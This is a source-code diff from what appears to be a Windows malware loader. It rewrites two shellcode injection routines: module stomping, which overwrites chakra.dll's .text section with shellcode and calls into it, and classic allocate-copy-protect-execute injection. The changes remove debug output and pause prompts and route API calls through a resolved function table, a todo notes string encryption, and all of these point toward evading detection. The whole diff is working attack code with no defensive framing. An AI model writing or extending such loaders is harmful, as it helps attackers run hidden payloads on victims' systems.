@@ -1,6 +1,7 @@
 #include <windows.h>
 
 #include <macros.h>
+#include <config.h>
 
 VOID Classic( 
     PVOID  ShellcodeBytes,
@@ -26,77 +27,69 @@ VOID LocalInjection(
 
 #ifdef INJECTION_STOMPER
 
+typedef struct _STOMP_ARGS {
+    PVOID  Backup;
+    UINT64 Length;
+} STOMP_AGRS, *PSTOMP_ARGS;
+
 VOID Stomper( 
     PVOID  ShellcodeBuffer,
     UINT64 ShellcodeSize
 ) {
+    STOMP_AGRS            StompArgs = { 0 };
+    PVOID                 MmBase    = { 0 };
+    PIMAGE_NT_HEADERS     Header    = { 0 };
+    PIMAGE_SECTION_HEADER SecHdr    = { 0 };
+    NTSTATUS              Status    = { 0 };
+    ULONG                 Protect   = { 0 };
+    HANDLE                Thread    = { 0 };
+    HANDLE                hFile     = NULL;
+    BOOL                  bCheck    = FALSE;
 
-    PVOID                 MmBase   = { 0 };
-    PIMAGE_NT_HEADERS     Header   = { 0 };
-    PIMAGE_SECTION_HEADER SecHdr   = { 0 };
-    NTSTATUS              Status   = { 0 };
-    ULONG                 Protect  = { 0 };
-    PVOID                 Buffer   = { 0 };
-    ULONG                 Length   = { 0 };
-    HANDLE                Thread   = { 0 };
-
-    //
-    // load shellcode into memory
-    //
-    printf( "[*] shellcode @ %p [%ld bytes]\n", Buffer, Length );
-
-    if ( ! ( MmBase = LoadLibraryExA( "chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES ) ) ) {
-        printf( "[!] LoadLibraryA Failed: %ld\n", GetLastError() );
-        goto END;
-    } else printf( "[*] loaded \"chakra.dll\" @ %p\n", MmBase );
+    MmBase = Instance.Win32.LoadLibraryExA( "chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES );
+    if ( !MmBase ) return;
 
     Header = C_PTR( U_PTR( MmBase ) + ( ( PIMAGE_DOS_HEADER ) MmBase )->e_lfanew );
 
     SecHdr = IMAGE_FIRST_SECTION( Header );
     for ( ULONG i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
-        if ( strcmp( C_PTR( SecHdr[ i ].Name ), ".text" ) ) {
+        if ( strcmp( C_PTR( SecHdr[ i ].Name ), ".text" ) ) { //todo: encrypt string ".text"
             break;
         }
     }
 
     MmBase = (UINT64)(MmBase) + SecHdr->VirtualAddress;
+    Instance.Win32.BlackoutMain = MmBase;
 
-    printf( "[*] target code section @ %p [%ld bytes]\n", MmBase, SecHdr->SizeOfRawData );
+    StompArgs.Length = ShellcodeSize;
 
-    if ( ! VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, & Protect ) ) {
-        printf( "[!] VirtualProtect Failed: %ld\n", GetLastError() );
-        goto END;
-    }
+    hFile = Instance.Win32.CreateFileMappingA( 
+        INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 
+        NULL, StompArgs.Length, NULL 
+    );
 
-    MmCopy( MmBase, Buffer, Length );
+    StompArgs.Backup = Instance.Win32.MapViewOfFile( 
+        hFile, FILE_MAP_WRITE | FILE_MAP_READ, 
+        NULL, NULL, StompArgs.Length 
+    );
 
-    if ( ! VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, &Protect ) ) {
-        printf( "[!] VirtualProtect Failed: %ld\n", GetLastError() );
-        goto END;
-    }
+    Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, &Protect );
+    
+    MmCopy( StompArgs.Backup, ShellcodeBuffer, StompArgs.Length );
+    MmCopy( MmBase, ShellcodeBuffer, ShellcodeSize );
 
-    puts( "[*] wrote shellcode into target module" );
-    printf( "[*] press enter..." );
-    getchar();
-
-    if ( ! ( Thread = CreateThread( NULL, 0, MmBase, NULL, 0, NULL ) ) ) {
-        printf( "[*] CreateThread Failed: %ld\n", GetLastError() );
-        goto END;
-    }
-
-    WaitForSingleObject( Thread, INFINITE );
-
-END:
-    if ( Thread ) {
-        CloseHandle( Thread );
-        Thread = NULL;
-    }
+    bCheck = Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, &Protect );
+    if ( !bCheck ) return;
+    
+    Instance.Win32.BlackoutMain( &StompArgs );
 
     return 0;
 }
 #endif
 
 #ifdef INJECTION_CLASSIC
+
+typedef (*ShellcodeMain)();
 
 VOID Classic( 
     PVOID  ShellcodeBytes,
@@ -108,25 +101,15 @@ VOID Classic(
 
     LPVOID  ShellcodeMemory = NULL;
 
-    ShellcodeMemory = VirtualAlloc( NULL, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
+    ShellcodeMemory = Instance.Win32.VirtualAlloc( NULL, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
 
-    if ( ! ShellcodeMemory )
-    {
-        printf("[-] Failed to allocate Virtual Memory\n");
-        return 0;
-    }
-
-    printf( "[*] Address => %p [%d bytes]\n", ShellcodeMemory, ShellcodeSize );
+    if ( ! ShellcodeMemory ) return 0;
 
     MmCopy( ShellcodeMemory, ShellcodeBytes, ShellcodeSize );
 
-    VirtualProtect( ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
+    Instance.Win32.VirtualProtect( ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
 
-    puts("[+] Execute shellcode... press enter");
-    getchar();
-
-    WaitForSingleObject( CreateThread( NULL, NULL, ShellcodeMemory, NULL, NULL, NULL ), INFINITE ); //((ShellcodeMain)ShellcodeMemory)();
-    printf( "[+] Running in thread id: %d\n", ThreadId ); 
+    ((ShellcodeMain)ShellcodeMemory)(); //Instance.Win32.WaitForSingleObject( Instance.Win32.CreateThread( NULL, NULL, ShellcodeMemory, NULL, NULL, NULL ), INFINITE ); //
 }
 
 #endif
